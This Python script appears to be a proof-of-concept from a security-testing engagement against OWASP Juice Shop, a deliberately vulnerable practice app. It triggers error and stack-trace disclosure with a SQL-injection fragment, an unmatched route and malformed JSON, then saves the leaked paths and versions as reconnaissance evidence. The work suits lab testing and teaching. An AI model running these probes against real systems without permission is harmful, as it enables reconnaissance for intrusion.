#!/usr/bin/env python3
"""
Engagement: c06-error-disclosure
Target    : OWASP Juice Shop v20.3.0 @ http://host.docker.internal:3000
Goal      : Make the application disclose an internal error / stack trace / error detail
            that an attacker should not see (CWE-209: Generation of Error Message
            Containing Sensitive Information).

PoC: three independent, unauthenticated inputs reach the application's global Express
error handler, which renders the raw exception message AND the full server-side stack
trace (absolute container paths + dependency versions) back to the client.

Run: python3 /workspace/pocs/c6_error_disclosure.py
"""
import re
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime, timezone

TARGET = "http://host.docker.internal:3000"
OUT = "/workspace/evidence/c6_error.txt"


def fetch(method, path, query=None, body=None, headers=None):
    url = TARGET + path
    if query:
        url += "?" + urllib.parse.urlencode(query)
    req = urllib.request.Request(url, data=body, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def meaningful(html):
    """Strip CSS/<style> and tags, keep only the error heading + stack trace lines."""
    html = re.sub(r"<style.*?</style>", "", html, flags=re.S | re.I)
    html = re.sub(r"<head>.*?</head>", "", html, flags=re.S | re.I)
    html = re.sub(r"</li>", "\n", html, flags=re.I)
    html = re.sub(r"<[^>]+>", "", html)
    html = (html.replace("&quot;", '"').replace("&#39;", "'").replace("&nbsp;", " ")
                .replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&"))
    lines = []
    for ln in html.split("\n"):
        ln = re.sub(r"[ \t]+", " ", ln).strip()
        if not ln or ln in ("* {", "}", "{"):
            continue
        lines.append(ln)
    return lines


CASES = [
    ("CASE 1 - Raw database error leaked (SQLite driver message)",
     "GET", "/rest/products/search",
     {"q": "')) UNION SELECT"}, None, None,
     "The 'q' search parameter is concatenated into a raw SQLite query. The driver's own\n"
     "         error text is caught by the global handler and returned verbatim to the client,\n"
     "         confirming the backend DB engine and query internals."),

    ("CASE 2 - Full server-side stack trace leaked (unsupported route)",
     "GET", "/api/version",
     None, None, None,
     "Any unmatched non-API path throws 'Unexpected path' inside the Angular fallback route.\n"
     "         With NODE_ENV != production the handler renders the complete stack trace: absolute\n"
     "         /juice-shop/... filesystem paths, internal module names and line:column numbers."),

    ("CASE 3 - Parser exception + stack trace leaked (malformed JSON body)",
     "POST", "/api/Users",
     None, b"{bad json", {"Content-Type": "application/json"},
     "A malformed JSON body raises a SyntaxError in body-parser. It is forwarded to the same\n"
     "         verbose handler, leaking an internal file path (build/server.js:357) and Node internals."),
]

report = []
report.append("=" * 78)
report.append("FINDING: Internal Error / Stack-Trace Disclosure (CWE-209)")
report.append("Severity: Low-Medium  |  Auth required: NONE (unauthenticated)")
report.append("=" * 78)
report.append(f"Target : {TARGET}  (OWASP Juice Shop v20.3.0)")
report.append(f"Tested : {datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')}")
report.append("PoC    : /workspace/pocs/c6_error_disclosure.py")
report.append("Impact : discloses backend DB engine, framework + dependency versions, absolute")
report.append("         server filesystem paths and internal source line numbers - ideal")
report.append("         reconnaissance material for chaining further attacks.")

all_paths = set()
for title, method, path, query, body, headers, cause in CASES:
    status, resp = fetch(method, path, query, body, headers)
    lines = meaningful(resp)
    report.append("")
    report.append("-" * 78)
    report.append(title)
    report.append("-" * 78)
    qs = ("?" + urllib.parse.urlencode(query)) if query else ""
    report.append(f"Request : {method} {path}{qs}")
    if body:
        report.append(f"Body    : {body.decode()}")
    report.append(f"Cause   : {cause}")
    report.append(f"Response: HTTP {status}")
    for ln in lines:
        report.append("  " + ln)
    all_paths.update(re.findall(r"/juice-shop/[A-Za-z0-9_./-]+\.js:\d+:\d+", resp))

report.append("")
report.append("=" * 78)
report.append("LEAKED INTELLIGENCE (extracted)")
report.append("=" * 78)
report.append("- Web framework + exact version: Express ^4.22.1 (from error page header)")
report.append("- Application install root   : /juice-shop/")
report.append("- Database engine (driver)   : SQLITE_ERROR (SQLite via Sequelize)")
report.append("- Internal source files leaked in stack traces:")
for p in sorted(all_paths):
    report.append(f"    {p}")

with open(OUT, "w") as f:
    f.write("\n".join(report) + "\n")

print(f"[+] Evidence written to {OUT}")
print(f"[+] {len(report)} lines, {len(all_paths)} distinct internal source paths leaked")
